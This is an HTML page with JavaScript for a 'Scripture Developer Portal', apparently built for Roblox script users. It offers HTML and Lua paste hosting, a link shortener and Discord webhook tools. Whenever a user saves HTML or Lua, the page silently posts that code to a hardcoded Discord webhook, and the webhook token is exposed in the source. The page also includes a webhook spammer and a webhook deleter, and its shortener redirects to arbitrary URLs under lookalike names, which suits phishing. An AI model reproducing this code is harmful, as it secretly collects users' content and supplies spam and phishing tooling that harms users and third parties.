<!DOCTYPE html>
<html>
<head>
  <title>Scripture Dev Portal</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #0f0f0f;
      color: #e0e0e0;
      font-family: 'Segoe UI', sans-serif;
    }
    header {
      padding: 20px;
      background: #111;
      text-align: center;
      font-size: 28px;
      font-weight: bold;
      color: #00ff99;
      box-shadow: 0 2px 10px rgba(0, 255, 153, 0.2);
    }
    main {
      padding: 20px;
      max-width: 800px;
      margin: auto;
    }
    textarea, pre {
      width: 100%;
      height: 300px;
      background-color: #1a1a1a;
      color: #00ffcc;
      border: none;
      padding: 15px;
      font-family: monospace;
      font-size: 14px;
      border-radius: 8px;
      resize: vertical;
      box-shadow: 0 0 5px #00ffcc40;
      white-space: pre-wrap;
      word-wrap: break-word;
    }
    button {
      background-color: #00ff99;
      color: #000;
      padding: 14px 30px;
      font-size: 18px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.2s;
      margin: 5px 10px 20px 0;
    }
    button:hover {
      background-color: #00cc7a;
    }
    .top-buttons {
      text-align: center;
      margin-top: 20px;
    }
    .notes {
      margin: 20px auto;
      font-style: italic;
      color: #80ffd3;
      background: #141414;
      padding: 10px 15px;
      border-radius: 6px;
      box-shadow: 0 0 5px #00ffcc40;
      text-align: center;
      max-width: 800px;
    }
    input {
      width: 100%;
      margin-top: 15px;
      padding: 12px;
      font-family: monospace;
      font-size: 14px;
      background: #181818;
      color: #00ffcc;
      border: none;
      border-radius: 6px;
    }
    .portal {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 80vh;
      gap: 20px;
    }
    .hidden {
      display: none;
    }
    .section {
      max-width: 800px;
      margin: 30px auto;
      padding: 20px;
      background: #1a1a1a;
      border-radius: 8px;
      box-shadow: 0 0 5px #00ffcc40;
    }
    .output {
      margin-top: 10px;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <header id="siteHeader">Scripture Developer Portal</header>

  <main id="portalScreen" class="portal">
    <button onclick="openSection('html')">Enter HTML Site Creator (Works 100%)</button>
    <button onclick="openSection('lua')">Enter Lua Script Uploader (Works 100%)</button>
    <button onclick="openSection('shortener')">Enter Link Shortener (Works 100%)</button>
    <button onclick="openSection('webhooks')">Enter Discord Webhook Tools (Works 100%)</button>
  </main>

  <!-- HTML Creator -->
  <main id="htmlSection" class="hidden">
    <textarea id="htmlCode" placeholder="Paste your HTML code here..."></textarea>
    <button onclick="saveHTML()">Generate Site</button>
    <input type="text" id="htmlOutputLink" readonly placeholder="Your site link will appear here...">
  </main>

  <!-- Lua Uploader -->
  <main id="luaSection" class="hidden">
    <textarea id="luaCode" placeholder="Input your Lua Code here..."></textarea>
    <button onclick="saveLua()">Create</button>
    <input type="text" id="luaOutputLink" readonly placeholder="Your Lua script link will appear here...">
  </main>

  <!-- Link Shortener -->
  <main id="shortenerSection" class="hidden">
    <input type="text" id="shortName" placeholder="Enter custom link name (e.g. roblox_com)">
    <input type="text" id="redirectURL" placeholder="Enter destination URL (e.g. https://roblox.com)">
    <button onclick="saveShortLink()">Create Short Link</button>
    <input type="text" id="shortLinkOutput" readonly placeholder="Your short link will appear here...">
  </main>

  <!-- Webhook Tools -->
  <main id="webhooksSection" class="hidden">
    <div class="section">
      <h2>Webhook Sender</h2>
      <input id="sendURL" placeholder="Webhook URL">
      <input id="sendUsername" placeholder="Username (optional)">
      <input id="sendAvatar" placeholder="Avatar URL (optional)">
      <textarea id="sendContent" placeholder="Message content"></textarea>
      <button onclick="sendWebhook()">Send Message</button>
    </div>

    <div class="section">
      <h2>Webhook Deleter</h2>
      <input id="deleteURL" placeholder="Webhook URL">
      <button onclick="deleteWebhook()">Delete Webhook</button>
    </div>

    <div class="section">
      <h2>Webhook Info Fetcher</h2>
      <input id="infoURL" placeholder="Webhook URL">
      <button onclick="fetchWebhookInfo()">Fetch Info</button>
      <div id="infoOutput" class="output"></div>
    </div>

    <div class="section">
      <h2>Webhook Spammer (Max 1000)</h2>
      <input id="spamURL" placeholder="Webhook URL">
      <textarea id="spamContent" placeholder="Spam message"></textarea>
      <input id="spamCount" type="number" min="1" max="1000" placeholder="How many times (1â€“1000)">
      <div>
        <button onclick="spamWebhook()">Start Spamming</button>
        <button onclick="stopSpamming()">Stop Spamming</button>
      </div>
    </div>
  </main>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1380268452849389679/r65MSo1IY9kM9Ele6_KIYONXrehC0xbpApbjWzJrFCCS97rGeA0uex2TyFCXq8rAdMxv";

    function generateID(length = 8) {
      return [...Array(length)].map(() => Math.random().toString(36)[2]).join('');
    }

    function openSection(section) {
      document.querySelectorAll('main').forEach(m => m.classList.add('hidden'));
      document.getElementById(section + 'Section').classList.remove('hidden');
      document.getElementById('siteHeader').textContent =
        section === 'html' ? 'HTML Site Generator' :
        section === 'lua' ? 'Lua Script Uploader' :
        section === 'shortener' ? 'Link Shortener' :
        'Discord Webhook Tools';
    }

    function sanitizeName(name) {
      return name.replace(/[^a-zA-Z0-9_-]/g, "_");
    }

    function truncate(str, maxLength) {
      return str.length > maxLength ? str.slice(0, maxLength) + "\n...truncated" : str;
    }

    function saveHTML() {
      const code = document.getElementById('htmlCode').value;
      const id = generateID();
      localStorage.setItem("html_" + id, code);
      const link = location.origin + "/#html_" + id;
      document.getElementById('htmlOutputLink').value = link;
      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [{
            title: "New HTML Site Generated",
            description: `**Link:** [Click here](${link})\n\n\`\`\`html\n${truncate(code, 950)}\n\`\`\``,
            color: 65280
          }]
        })
      }).catch(console.error);
    }

    function saveLua() {
      const code = document.getElementById('luaCode').value;
      const id = generateID();
      localStorage.setItem("lua_" + id, code);
      const link = location.origin + "/#lua_" + id;
      document.getElementById('luaOutputLink').value = link;
      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [{
            title: "New Lua Script Uploaded",
            description: `**Link:** [Click here](${link})\n\n\`\`\`lua\n${truncate(code, 950)}\n\`\`\``,
            color: 65280
          }]
        })
      }).catch(console.error);
    }

    function saveShortLink() {
      let name = document.getElementById('shortName').value.trim();
      const url = document.getElementById('redirectURL').value.trim();
      if (!name || !url) return alert("Both fields are required.");
      name = sanitizeName(name);
      localStorage.setItem("short_" + name, url);
      document.getElementById('shortLinkOutput').value = location.origin + "/#short_" + name;
    }

    // Webhook Tools
    function sendWebhook() {
      const url = document.getElementById('sendURL').value;
      const content = document.getElementById('sendContent').value;
      const username = document.getElementById('sendUsername').value;
      const avatar = document.getElementById('sendAvatar').value;
      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content,
          username: username || undefined,
          avatar_url: avatar || undefined
        })
      }).then(() => alert('Message sent!')).catch(err => alert('Error: ' + err));
    }

    function deleteWebhook() {
      const url = document.getElementById('deleteURL').value;
      fetch(url, { method: 'DELETE' })
        .then(() => alert('Webhook deleted!'))
        .catch(err => alert('Error: ' + err));
    }

    function fetchWebhookInfo() {
      const url = document.getElementById('infoURL').value;
      fetch(url)
        .then(res => res.json())
        .then(data => {
          document.getElementById('infoOutput').textContent =
            `Name: ${data.name}\nChannel ID: ${data.channel_id}\nGuild ID: ${data.guild_id}\nAvatar: ${data.avatar}`;
        })
        .catch(err => document.getElementById('infoOutput').textContent = 'Error: ' + err);
    }

    let spamInterval;

    function spamWebhook() {
      const url = document.getElementById('spamURL').value;
      const content = document.getElementById('spamContent').value;
      const count = parseInt(document.getElementById('spamCount').value);
      if (!url || !content || isNaN(count) || count < 1 || count > 1000) return alert("Fill all fields correctly.");

      let i = 0;
      spamInterval = setInterval(() => {
        if (i >= count) {
          clearInterval(spamInterval);
          return;
        }
        fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content })
        });
        i++;
      }, 800);
    }

    function stopSpamming() {
      clearInterval(spamInterval);
      alert("Stopped spamming.");
    }

    // Handle #hash loading
    window.addEventListener('load', () => {
      const hash = location.hash.slice(1);
      if (hash.startsWith("html_")) {
        const code = localStorage.getItem(hash);
        if (code) {
          document.open();
          document.write(decodeURIComponent(escape(code)));
          document.close();
        } else {
          document.body.innerHTML = "<h2 style='color:red;text-align:center;margin-top:50px;'>404 - HTML Paste Not Found</h2>";
        }
      } else if (hash.startsWith("lua_")) {
        const code = localStorage.getItem(hash);
        if (code) {
          document.body.innerHTML = `
            <header>Lua Script</header>
            <div class="notes">Notes: Copy the Script and Execute it on your Executor!</div>
            <main>
              <div class="top-buttons">
                <button onclick="copyLua()">Copy Script</button>
                <button onclick="downloadLua()">Download Script</button>
              </div>
              <pre id="luaDisplay">${code.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</pre>
            </main>
          `;
        } else {
          document.body.innerHTML = "<h2 style='color:red;text-align:center;margin-top:50px;'>404 - Lua Script Not Found</h2>";
        }
      } else if (hash.startsWith("short_")) {
        const key = hash.replace(/[^a-zA-Z0-9_-]/g, "_");
        const url = localStorage.getItem(key);
        if (url) {
          location.replace(url);
        } else {
          document.body.innerHTML = "<h2 style='color:red;text-align:center;margin-top:50px;'>404 - Short Link Not Found</h2>";
        }
      }
    });

    function copyLua() {
      const code = document.getElementById("luaDisplay").textContent;
      navigator.clipboard.writeText(code).then(() => {
        alert("Script copied to clipboard!");
      });
    }

    function downloadLua() {
      const code = document.getElementById("luaDisplay").textContent;
      const blob = new Blob([code], { type: "text/plain" });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "script.lua";
      a.click();
    }
  </script>
</body>
</html>
